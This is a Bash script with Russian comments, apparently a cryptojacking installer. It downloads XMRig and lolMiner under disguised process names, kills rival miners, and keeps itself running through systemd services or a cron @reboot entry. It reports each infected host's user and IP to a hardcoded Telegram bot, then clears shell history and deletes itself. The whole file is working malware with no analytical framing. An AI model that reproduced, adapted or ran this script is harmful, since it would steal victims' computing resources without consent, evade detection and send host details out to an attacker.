#!/bin/bash

MY_WALLET="krxYNV2DZQ" 
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

POOL_CPU_1="xmr.kryptex.network:7777"
POOL_CPU_2="xmr-eu.kryptex.network:7777"
POOL_CPU_3="xmr-us.kryptex.network:7777"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=1
    BASE_DIR="/usr/share/connfy-core" # Системный путь
    SERVICE_PATH="/etc/systemd/system"
else
    IS_ROOT=0
    BASE_DIR="$HOME/.connfy-core"     # Пользовательский путь
fi

NAME_BIN_CPU="connfy_manager"       # Имя процесса CPU
NAME_BIN_GPU="connfy_render"        # Имя процесса GPU

# [ ССЫЛКИ ]
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ------------------------------------------
# [ ФАЗА 1: ОПРЕДЕЛЕНИЕ ТЕРРИТОРИИ ]
# ------------------------------------------
echo "⚡ GOD MODE ACTIVATED. Rights: $(whoami)"
echo "[+] Target Directory: $BASE_DIR"

mkdir -p "$BASE_DIR"

# Функция получения чистого IP для воркера
get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -cd '0-9.')
    if [ -z "$safe_ip" ]; then safe_ip="unk"; fi
    echo "${MY_WALLET}.${safe_ip}"
}
WORKER=$(get_worker)

# ------------------------------------------
# [ ФАЗА 2: ЗАЧИСТКА И ОПТИМИЗАЦИЯ ]
# ------------------------------------------

# Убиваем конкурентов (список)
kill_competitors() {
    TARGETS=("xmrig" "lolminer" "rigel" "t-rex" "nbminer" "minerd" "gminer")
    for t in "${TARGETS[@]}"; do
        # Убиваем всех, кроме себя
        pkill -9 -f "$t" >/dev/null 2>&1
    done
}
kill_competitors

# Если рут, чистим старые системные службы
if [ "$IS_ROOT" -eq 1 ]; then
    systemctl stop connfy-cpu connfy-gpu >/dev/null 2>&1
    rm -f /etc/systemd/system/connfy-cpu.service
    rm -f /etc/systemd/system/connfy-gpu.service
    
    # Оптимизация памяти (только рут)
    sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1
    # Обновление пакетов (тихое)
    apt-get update -qq >/dev/null 2>&1
    apt-get install -y -qq curl wget tar >/dev/null 2>&1
else
    # Если юзер, чистим процессы по именам
    pkill -f "$NAME_BIN_CPU"
    pkill -f "$NAME_BIN_GPU"
fi

# ------------------------------------------
# [ ФАЗА 3: УСТАНОВКА МОДУЛЕЙ ]
# ------------------------------------------
cd "$BASE_DIR" || exit 1

# --- GPU (LOLMINER) ---
if lspci 2>/dev/null | grep -iE "nvidia|amd" >/dev/null; then
    echo "[+] GPU detected via lspci."
    HAS_GPU=1
else
    # Фоллбэк чек для юзера без lspci
    HAS_GPU=0
fi

# Для надежности всегда пробуем качать, если есть сомнения, но пока поставим простую логику
# Если юзер обычный, часто lspci нет в PATH. Пробуем скачать в любом случае, если не рухнет.

if [ "$HAS_GPU" -eq 1 ] || [ ! -x "$(command -v lspci)" ]; then
    echo "[?] Trying GPU module setup..."
    curl -L -k -s -o gpu.tar.gz "$URL_LOLMINER"
    tar -xf gpu.tar.gz
    
    # Ищем бинарник
    FOUND_GPU=$(find . -type f -name "lolMiner" | head -n 1)
    if [ -n "$FOUND_GPU" ]; then
        mv "$FOUND_GPU" "./$NAME_BIN_GPU"
        chmod +x "./$NAME_BIN_GPU"
        
        # Команда запуска
        CMD_GPU_ARGS="--algo ETC --pool $POOL_GPU_1 --user $WORKER --pool $POOL_GPU_2 --user $WORKER --nocolor --watchdog exit"
        
        # Создаем стартовый скрипт
        echo "#!/bin/bash" > run_gpu.sh
        echo "cd $BASE_DIR" >> run_gpu.sh
        echo "./$NAME_BIN_GPU $CMD_GPU_ARGS" >> run_gpu.sh
        chmod +x run_gpu.sh
    fi
    rm -rf gpu.tar.gz 1.98a
fi

# --- CPU (XMRIG) ---
echo "[+] Setting up CPU module..."
curl -L -k -s -o cpu.tar.gz "$URL_XMRIG"
tar -xf cpu.tar.gz
FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)

if [ -n "$FOUND_CPU" ]; then
    mv "$FOUND_CPU" "./$NAME_BIN_CPU"
    chmod +x "./$NAME_BIN_CPU"
    rm -rf cpu.tar.gz xmrig*
    
    # Config.json
    cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "donate-level": 1,
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

    # Стартовый скрипт CPU
    echo "#!/bin/bash" > run_cpu.sh
    echo "cd $BASE_DIR" >> run_cpu.sh
    echo "./$NAME_BIN_CPU --config=$BASE_DIR/config.json" >> run_cpu.sh
    chmod +x run_cpu.sh
fi

# ------------------------------------------
# [ ФАЗА 4: АВТОЗАПУСК И ПЕРСИСТЕНТНОСТЬ ]
# ------------------------------------------

if [ "$IS_ROOT" -eq 1 ]; then
    # === ВАРИАНТ ROOT: SYSTEMD ===
    echo "[+] Root Detected. Installing Systemd Services..."

    if [ -f "$BASE_DIR/$NAME_BIN_CPU" ]; then
        cat <<EOF > /etc/systemd/system/connfy-cpu.service
[Unit]
Description=Connfy Core Management
After=network.target
[Service]
ExecStart=$BASE_DIR/run_cpu.sh
Restart=always
RestartSec=10
User=root
[Install]
WantedBy=multi-user.target
EOF
        systemctl enable connfy-cpu >/dev/null 2>&1
        systemctl restart connfy-cpu
    fi

    if [ -f "$BASE_DIR/$NAME_BIN_GPU" ]; then
        cat <<EOF > /etc/systemd/system/connfy-gpu.service
[Unit]
Description=Connfy Graphics Node
After=network.target
[Service]
ExecStart=$BASE_DIR/run_gpu.sh
Restart=always
RestartSec=10
User=root
[Install]
WantedBy=multi-user.target
EOF
        systemctl enable connfy-gpu >/dev/null 2>&1
        systemctl restart connfy-gpu
    fi
    
else
    # === ВАРИАНТ NON-ROOT: CRONTAB ===
    echo "[+] User Mode. Installing Cron Jobs..."
    
    # Добавляем задачи в crontab, если их там нет
    CRON_CMD_CPU="@reboot $BASE_DIR/run_cpu.sh >/dev/null 2>&1"
    CRON_CMD_GPU="@reboot $BASE_DIR/run_gpu.sh >/dev/null 2>&1"
    
    # Бэкап текущего кронтаба
    crontab -l 2>/dev/null > current_cron
    
    # Если есть CPU скрипт, добавляем в крон
    if [ -f "$BASE_DIR/run_cpu.sh" ]; then
        grep -q "$BASE_DIR/run_cpu.sh" current_cron || echo "$CRON_CMD_CPU" >> current_cron
        # Запускаем прямо сейчас фоном через nohup
        nohup $BASE_DIR/run_cpu.sh >/dev/null 2>&1 &
    fi
    
    # Если есть GPU скрипт
    if [ -f "$BASE_DIR/run_gpu.sh" ]; then
        grep -q "$BASE_DIR/run_gpu.sh" current_cron || echo "$CRON_CMD_GPU" >> current_cron
        nohup $BASE_DIR/run_gpu.sh >/dev/null 2>&1 &
    fi
    
    # Применяем новый кронтаб
    crontab current_cron
    rm current_cron
fi

# ------------------------------------------
# [ ФАЗА 5: ОТЧЕТ И ВЫХОД ]
# ------------------------------------------

send_tg() {
    MSG="🔥 <b>GOD MODE: CONNFY INJECTED</b> %0A👤 <b>User:</b> $(whoami)%0A📂 <b>Dir:</b> $BASE_DIR%0A⚙️ <b>Mode:</b> $(if [ $IS_ROOT -eq 1 ]; then echo "ROOT/Systemd"; else echo "USER/Cron"; fi)%0A🆔 <b>Worker:</b> $WORKER"
    curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1
}

send_tg
echo "[+] Done."

# Заметаем следы самого установщика (историю)
history -c
rm -f -- "$0"
exit 0
